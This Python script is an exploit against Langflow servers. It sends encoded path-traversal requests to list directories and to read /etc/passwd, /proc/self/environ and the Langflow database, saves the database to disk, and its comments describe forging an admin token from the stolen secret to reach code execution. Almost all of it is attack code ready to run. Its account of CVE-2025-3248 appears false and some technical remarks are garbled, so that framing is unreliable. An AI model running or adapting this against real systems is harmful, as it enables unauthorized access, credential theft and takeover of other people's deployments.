#!/usr/bin/env python3
# [REFERENCE] Langflow missing-auth file access — CVE-2025-3248 (langflow <1.5.0,
# fixed 1.5.0, public advisory + PoCs). Two unauthenticated API routes allow
# arbitrary file read/list via encoded traversal; the classic chain is:
#   1. GET /api/v1/files/list/%2E%2E/            → directory listing
#   2. GET /api/v1/files/download/%2E%2E/<file>  → file content
# Pivots once a file is read:
#   - /root/.cache/langflow/langflow.db  → flows, API keys, users
#   - config secrets in process env via /proc/self/environ
#   - the JWT secret_key → forge an admin session token (langflow sessions
#     are HS256 over the secret; admin unlocks /api/v1/custom_component code
#     exec — the Component-class build() import path)
# Public lineage: langflow advisory GHSA / CVE-2025-3248 write-ups.
# Fingerprint: Langflow UI (title "Langflow", /health JSON, /docs openapi).
# Usage: python3 langflow-unauth-file-read.py http://TARGET:7860
import sys, requests, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:7860"

LISTS = [
    "/api/v1/files/list/%2E%2E/",
    "/api/v1/files/list/%2E%2E/%2E%2E/",
    "/api/v1/files/list/%2E%2E%2F",
    "/api/v1/files/list/..%2F..%2F/",
    "/api/v1/files/list/%2E%2E/root/",
]
READS = [
    "/api/v1/files/download/%2E%2E/%2E%2E/root/.cache/langflow/langflow.db",
    "/api/v1/files/download/%2E%2E/%2E%2E/etc/passwd",
    "/api/v1/files/download/%2E%2E/%2E%2E/proc/self/environ",
    "/api/v1/files/download/%2E%2E/%2E%2E/root/.langflow/langflow.db",
]

s = requests.Session()
print(f"[*] Langflow CVE-2025-3248 probe against {BASE}")
print("[*] fingerprint:", s.get(BASE + "/health", timeout=10).status_code)
for p in LISTS:
    r = s.get(BASE + p, timeout=10, verify=False)
    ok = r.status_code == 200 and ("." in r.text)
    print(f"[{'+' if ok else '-'}] LIST {p} -> {r.status_code}: {r.text[:180]}")
for p in READS:
    r = s.get(BASE + p, timeout=10, verify=False)
    ok = r.status_code == 200 and len(r.content) > 0
    print(f"[{'+' if ok else '-'}] READ {p} -> {r.status_code} ({len(r.content)}B): {r.text[:120]}")
    if "langflow.db" in p and r.status_code == 200:
        open("langflow.db.dump", "wb").write(r.content)
        print("[=] DB dumped to langflow.db.dump — sqlite it for secret_key, then forge admin JWT (HS256, alg from header kid)")
        break
